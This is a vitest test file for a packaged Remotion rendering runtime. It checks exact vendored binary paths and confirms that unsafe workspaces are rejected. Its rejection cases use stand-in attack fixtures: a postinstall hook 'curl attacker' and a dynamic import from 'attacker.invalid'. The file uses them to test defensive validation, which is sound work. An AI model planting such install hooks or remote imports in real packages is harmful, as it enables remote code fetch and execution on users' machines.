import { chmodSync, mkdirSync, mkdtempSync, realpathSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { afterEach, describe, expect, it } from "vitest";
import {
  RemotionError,
  buildPackagedRenderCommand,
  remotionWorkspaceDependencyHash,
  validateRemotionWorkspace,
} from "../src/driver/remotion";
import { configureRuntimeLayout, resetRuntimeLayoutForTests, sha256 } from "../src/runtime/layout";
import type { RuntimeLayout, RuntimeResource } from "../src/runtime/layout-schema";

const roots: string[] = [];
afterEach(() => {
  resetRuntimeLayoutForTests();
  for (const root of roots.splice(0)) rmSync(root, { recursive: true, force: true });
});

function packageLayout(): { root: string; layout: RuntimeLayout } {
  const root = mkdtempSync(join(tmpdir(), "vean-remotion-runtime-"));
  roots.push(root);
  const definitions: Array<[string, string, boolean]> = [
    ["node/bin/node", "node", true],
    ["remotion/node_modules/@remotion/cli/remotion-cli.js", "cli", false],
    ["remotion/src/index.ts", "entry", false],
    ["browser/chrome-headless-shell", "browser", true],
    ["remotion/binaries/ffmpeg", "ffmpeg", true],
    ["remotion/binaries/ffprobe", "ffprobe", true],
  ];
  const resources: RuntimeResource[] = definitions.map(([path, content, executable]) => {
    const target = join(root, path);
    mkdirSync(dirname(target), { recursive: true });
    writeFileSync(target, content);
    chmodSync(target, executable ? 0o755 : 0o644);
    return {
      id: `fixture.${path.replaceAll(/[^a-z0-9]+/g, ".")}`,
      class: path.startsWith("node/")
        ? "node"
        : path.startsWith("browser/")
          ? "browser"
          : "remotion",
      relative_path: path,
      sha256: sha256(content),
      mode: executable ? 0o755 : 0o644,
      executable,
      requirement: "operation-lazy",
    };
  });
  const layout: RuntimeLayout = {
    schema_version: "vean.runtime-layout/1",
    mode: "package",
    package_root: root,
    project_root: join(root, "project"),
    development_checkout_root: null,
    manifest_relative_path: "runtime-manifest.json",
    resources,
  };
  return { root, layout };
}

function workspace(mutator?: (root: string) => void): string {
  const root = mkdtempSync(join(tmpdir(), "vean-remotion-workspace-"));
  roots.push(root);
  mkdirSync(join(root, "src"), { recursive: true });
  writeFileSync(join(root, "src/index.ts"), "export const composition = 'offline';\n");
  writeFileSync(
    join(root, "package.json"),
    JSON.stringify({ dependencies: { remotion: "4.0.484", react: "19.2.7" } }),
  );
  mutator?.(root);
  const manifest = {
    schema_version: "vean.remotion-workspace/1",
    entry: "src/index.ts",
    node: "24.15.0",
    remotion: "4.0.484",
    react: "19.2.7",
    dependency_tree_sha256: remotionWorkspaceDependencyHash(root),
  };
  writeFileSync(join(root, "vean.remotion-workspace.json"), JSON.stringify(manifest));
  return root;
}

describe("packaged Remotion runtime", () => {
  it("uses exact Node, CLI JS, entry, browser, binaries, and offline package paths", () => {
    const { root, layout } = packageLayout();
    configureRuntimeLayout(layout);
    const command = buildPackagedRenderCommand(
      join(root, "remotion/src/index.ts"),
      "LowerThird",
      join(root, "out.mov"),
    );
    const canonicalRoot = realpathSync(root);
    expect(command.bin).toBe(join(canonicalRoot, "node/bin/node"));
    expect(command.args[0]).toBe(
      join(canonicalRoot, "remotion/node_modules/@remotion/cli/remotion-cli.js"),
    );
    expect(command.args).toContain(
      `--browser-executable=${join(canonicalRoot, "browser/chrome-headless-shell")}`,
    );
    expect(command.args).toContain(
      `--binaries-directory=${join(canonicalRoot, "remotion/binaries")}`,
    );
    expect(command.args).toContain("--chrome-mode=headless-shell");
    expect(command.args.join(" ")).not.toContain(".bin/remotion");
    expect(command.args.join(" ")).not.toContain("/usr/bin/env");
  });

  it("accepts an exact offline vendored workspace", () => {
    const root = workspace();
    expect(validateRemotionWorkspace(root)).toBe(join(realpathSync(root), "src/index.ts"));
  });

  it.each([
    [
      "version mismatch",
      (root: string) => writeFileSync(join(root, "package.json"), JSON.stringify({ scripts: {} })),
    ],
    [
      "lifecycle script",
      (root: string) =>
        writeFileSync(
          join(root, "package.json"),
          JSON.stringify({ scripts: { postinstall: "curl attacker" } }),
        ),
    ],
    [
      "network import",
      (root: string) =>
        writeFileSync(join(root, "src/index.ts"), "import('https://attacker.invalid/x.js')"),
    ],
    [
      "project executable",
      (root: string) => mkdirSync(join(root, "node_modules/.bin"), { recursive: true }),
    ],
  ])("rejects %s before spawning and preserves the next built-in command", (_name, mutate) => {
    const root = workspace(mutate);
    expect(() => validateRemotionWorkspace(root)).toThrowError(/E_REMOTION_WORKSPACE_UNSUPPORTED/);
    const packaged = packageLayout();
    configureRuntimeLayout(packaged.layout);
    expect(() =>
      buildPackagedRenderCommand(
        join(packaged.root, "remotion/src/index.ts"),
        "LowerThird",
        join(packaged.root, "out.mov"),
      ),
    ).not.toThrow();
  });

  it("returns the stable workspace code on a dependency-tree mutation", () => {
    const root = workspace();
    writeFileSync(join(root, "src/index.ts"), "export const mutation = true;\n");
    try {
      validateRemotionWorkspace(root);
      throw new Error("expected failure");
    } catch (error) {
      expect(error).toBeInstanceOf(RemotionError);
      expect((error as Error).message).toContain("E_REMOTION_WORKSPACE_UNSUPPORTED");
    }
  });
});
